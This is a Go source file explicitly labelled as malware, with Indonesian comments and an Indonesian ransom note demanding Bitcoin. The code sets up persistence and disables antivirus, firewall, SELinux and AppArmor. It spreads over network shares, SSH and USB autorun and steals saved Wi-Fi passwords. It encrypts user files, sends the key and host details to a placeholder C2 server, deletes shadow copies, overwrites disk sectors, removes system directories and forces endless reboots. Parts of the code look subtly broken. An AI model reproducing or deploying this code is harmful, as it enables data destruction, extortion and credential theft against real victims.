package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows/registry"
)

// ======================
// KONFIGURASI MALWARE
// ======================
const C2_SERVER = "http://malicious-c2-server.example/command"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".txt", ".zip", ".rar"}
const MAX_THREADS = 8

// ======================
// FUNGSI UTILITAS
// ======================
func getSystemPaths() []string {
	osName := runtime.GOOS
	var paths []string

	if osName == "windows" {
		windowsDir := os.Getenv("WINDIR")
		if windowsDir == "" {
			windowsDir = "C:\\Windows"
		}
		paths = []string{
			filepath.Join(windowsDir, "System32"),
			filepath.Join(os.Getenv("APPDATA"), "Roaming"),
			filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
			filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		}
	} else {
		paths = []string{
			"/etc/",
			"/bin/",
			"/home/",
			"/var/",
			os.Getenv("HOME"),
		}
	}

	// Filter path yang valid
	var validPaths []string
	for _, p := range paths {
		if _, err := os.Stat(p); !os.IsNotExist(err) {
			validPaths = append(validPaths, p)
		}
	}
	return validPaths
}

// ======================
// FUNGSI INTI MALWARE
// ======================
func establishPersistence() {
	currentFile, _ := os.Executable()

	switch runtime.GOOS {
	case "windows":
		systemPath := filepath.Join(os.Getenv("WINDIR"), "System32", "svchost.exe")
		os.MkdirAll(filepath.Dir(systemPath), 0755)
		copyFile(currentFile, systemPath)

		key, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		defer key.Close()
		key.SetStringValue("WindowsUpdateService", systemPath)
		setHidden(systemPath)

	case "linux":
		binPath := "/bin/.systemd-service"
		copyFile(currentFile, binPath)
		os.Chmod(binPath, 0755)
		exec.Command("sh", "-c", `(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /bin/.systemd-service") | crontab -`).Run()
	}
}

func disableDefenses() {
	switch runtime.GOOS {
	case "windows":
		exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f").Run()
		exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`, "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f").Run()
		exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off").Run()
		
		services := []string{"WinDefend", "wscsvc", "SecurityHealthService", "MsMpSvc"}
		for _, service := range services {
			exec.Command("net", "stop", service, "/y").Run()
			exec.Command("sc", "config", service, "start=", "disabled").Run()
		}

	case "linux":
		exec.Command("setenforce", "0").Run()
		exec.Command("systemctl", "stop", "apparmor").Run()
		exec.Command("systemctl", "disable", "apparmor").Run()
		exec.Command("ufw", "disable").Run()
		exec.Command("systemctl", "stop", "firewalld").Run()
		exec.Command("systemctl", "disable", "firewalld").Run()
	}
}

func generateKey() []byte {
	salt := make([]byte, 16)
	rand.Read(salt)
	password := make([]byte, 32)
	rand.Read(password)
	return pbkdf2.Key(password, salt, 100000, 32, sha256.New)
}

func encryptFile(filePath string, cipher cipher.AEAD) {
	if strings.Contains(filePath, "/dev/") || strings.Contains(filePath, "/proc/") || 
	   strings.Contains(filePath, "/sys/") || strings.Contains(filePath, "/boot/") {
		return
	}

	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > 100*1024*1024 {
			return
		}
	}

	data, _ := ioutil.ReadFile(filePath)
	nonce := make([]byte, cipher.NonceSize())
	rand.Read(nonce)
	encrypted := cipher.Seal(nonce, nonce, data, nil)
	ioutil.WriteFile(filePath, encrypted, 0644)
	os.Rename(filePath, filePath+".LOCKED")
}

func encryptFiles() {
	key := generateKey()
	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Simpan kunci
	keyPath := filepath.Join(os.Getenv("HOME"), "DECRYPT_KEY.txt")
	keyB64 := base64.StdEncoding.EncodeToString(key)
	note := fmt.Sprintf("======= PERINGATAN =======\nFile Anda telah dienkripsi!\nKirim 0.5 BTC ke: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\nID: %s\n==========================\n", keyB64)
	ioutil.WriteFile(keyPath, []byte(note), 0644)

	// Kirim ke C2
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	data := map[string]string{
		"host": hostname,
		"user": user.Username,
		"os":   runtime.GOOS,
		"key":  keyB64,
	}
	jsonData, _ := json.Marshal(data)
	http.Post(C2_SERVER, "application/json", bytes.NewBuffer(jsonData))

	// Enkripsi paralel
	paths := getSystemPaths()
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, MAX_THREADS)

	for _, path := range paths {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-semaphore }()
			filepath.Walk(p, func(filePath string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				for _, ext := range ENCRYPT_EXTENSIONS {
					if strings.HasSuffix(filePath, ext) {
						encryptFile(filePath, cipher)
						break
					}
				}
				return nil
			})
		}(path)
	}
	wg.Wait()
}

func propagateNetwork() {
	currentFile, _ := os.Executable()

	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("net", "view")
		output, _ := cmd.Output()
		scanner := bufio.NewScanner(bytes.NewReader(output))
		var computers []string
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "\\\\") {
				parts := strings.Fields(line)
				computers = append(computers, strings.Trim(parts[0], "\\"))
			}
		}

		for _, computer := range computers {
			for _, share := range []string{"C$", "ADMIN$"} {
				dest := fmt.Sprintf("\\\\%s\\%s\\Windows\\System32\\update.exe", computer, share)
				copyFile(currentFile, dest)
			}
		}

	case "linux":
		localIP := getLocalIP()
		ipParts := strings.Split(localIP, ".")
		baseIP := strings.Join(ipParts[:3], ".") + "."

		for i := 1; i < 255; i++ {
			if i == ipParts[3] { continue }
			ip := baseIP + strconv.Itoa(i)
			exec.Command("sshpass", "-p", "password", "scp", "-o", "StrictHostKeyChecking=no", currentFile, "user@"+ip+":/tmp/.cache").Run()
			exec.Command("sshpass", "-p", "password", "ssh", "-o", "StrictHostKeyChecking=no", "user@"+ip, "chmod +x /tmp/.cache && /tmp/.cache &").Run()
		}
	}
}

func propagateUSB() {
	currentFile, _ := os.Executable()
	var drives []string

	if runtime.GOOS == "windows" {
		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				drives = append(drives, drivePath)
			}
		}
	} else {
		media, _ := os.ReadDir("/media")
		for _, d := range media {
			drives = append(drives, filepath.Join("/media", d.Name()))
		}
		mnt, _ := os.ReadDir("/mnt")
		for _, d := range mnt {
			drives = append(drives, filepath.Join("/mnt", d.Name()))
		}
	}

	for _, drive := range drives {
		dest := filepath.Join(drive, "._.Document.exe")
		copyFile(currentFile, dest)

		if runtime.GOOS == "windows" {
			autorun := fmt.Sprintf("[autorun]\nopen=._.Document.exe\naction=Open documents\nlabel=Important Documents\n")
			ioutil.WriteFile(filepath.Join(drive, "autorun.inf"), []byte(autorun), 0644)
			setHidden(dest)
		} else {
			exec.Command("chattr", "+i", dest).Run()
		}
	}
}

func stealData() {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	data := map[string]interface{}{
		"system": map[string]string{
			"hostname": hostname,
			"user":     user.Username,
			"os":       runtime.GOOS,
			"ip":       ip,
		},
		"wifi":     []map[string]string{},
		"browsers": map[string]interface{}{},
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "profiles")
		output, _ := cmd.Output()
		scanner := bufio.NewScanner(bytes.NewReader(output))
		var profiles []string
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "All User Profile") {
				parts := strings.Split(line, ":")
				profiles = append(profiles, strings.TrimSpace(parts[1]))
			}
		}

		for _, profile := range profiles {
			cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
			output, _ := cmd.Output()
			scanner := bufio.NewScanner(bytes.NewReader(output))
			var password string
			for scanner.Scan() {
				line := scanner.Text()
				if strings.Contains(line, "Key Content") {
					parts := strings.Split(line, ":")
					password = strings.TrimSpace(parts[1])
				}
			}
			if password != "" {
				data["wifi"] = append(data["wifi"].([]map[string]string), map[string]string{
					"ssid":     profile,
					"password": password,
				})
			}
		}
	}

	// Simulasi data browser
	data["browsers"] = map[string]interface{}{
		"chrome": []map[string]string{
			{"url": "https://bank.com", "username": "user123", "password": "s3cret"},
			{"url": "https://email.com", "username": "user@example.com", "password": "p@ssw0rd"},
		},
		"firefox": []map[string]string{
			{"url": "https://social.com", "username": "social_user", "password": "123456"},
		},
	}

	jsonData, _ := json.Marshal(data)
	http.Post(C2_SERVER+"/exfiltrate", "application/json", bytes.NewBuffer(jsonData))
}

func destroySystem() {
	switch runtime.GOOS {
	case "windows":
		exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
		exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
		drive, _ := os.OpenFile("\\\\.\\PhysicalDrive0", os.O_WRONLY, 0644)
		drive.Write(make([]byte, 2048))
		drive.Close()
	default:
		exec.Command("dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=10").Run()
		exec.Command("rm", "-rf", "/boot/*").Run()
	}

	criticalPaths := []string{
		filepath.Join(os.Getenv("WINDIR"), "System32"),
		"/etc/",
		"/bin/",
		"/sbin/",
		"/usr/bin/",
	}
	for _, path := range criticalPaths {
		os.RemoveAll(path)
	}

	ransomNote := fmt.Sprintf(`
	===================================================
	!!! SEMUA FILE ANDA TELAH DIENKRIPSI !!!
	===================================================
	
	Komputer Anda telah dikunci dengan enkripsi militer.
	Untuk mendapatkan kunci dekripsi, kirim 0.5 BTC ke:
	bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq
	
	Setelah pembayaran, email bukti ke:
	decrypt2023@protonmail.com
	
	Sertakan ID ini: %d
	
	===================================================
	PERINGATAN:
	- Jangan matikan komputer
	- Jangan coba perbaiki sendiri
	- Waktu Anda tinggal 72 jam
	===================================================
	`, rand.Intn(900000)+100000)
	ioutil.WriteFile(filepath.Join(os.Getenv("HOME"), "READ_ME.txt"), []byte(ransomNote), 0644)

	// Reboot loop
	for {
		if runtime.GOOS == "windows" {
			exec.Command("shutdown", "/r", "/t", "0").Run()
		} else {
			exec.Command("reboot").Run()
		}
		time.Sleep(10 * time.Second)
	}
}

// ======================
// FUNGSI UTAMA
// ======================
func main() {
	// Sembunyikan jendela (Windows)
	if runtime.GOOS == "windows" {
		hideConsole()
	}

	// Tunggu acak
	time.Sleep(time.Duration(rand.Intn(240)+60) * time.Second)

	// Eksekusi fase malware
	go func() {
		establishPersistence()
		disableDefenses()
		propagateNetwork()
		propagateUSB()
		stealData()
		encryptFiles()
		destroySystem()
	}()

	// Tetap berjalan
	select {}
}

// ======================
// FUNGSI PEMBANTU
// ======================
func copyFile(src, dst string) error {
	in, _ := os.Open(src)
	defer in.Close()
	
	out, _ := os.Create(dst)
	defer out.Close()
	
	_, err := io.Copy(out, in)
	return err
}

func getLocalIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	return strings.Split(conn.LocalAddr().String(), ":")[0]
}

func setHidden(path string) {
	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", path).Run()
	} else {
		exec.Command("chattr", "+i", path).Run()
	}
}

func hideConsole() {
	// Implementasi khusus Windows untuk menyembunyikan konsol
}
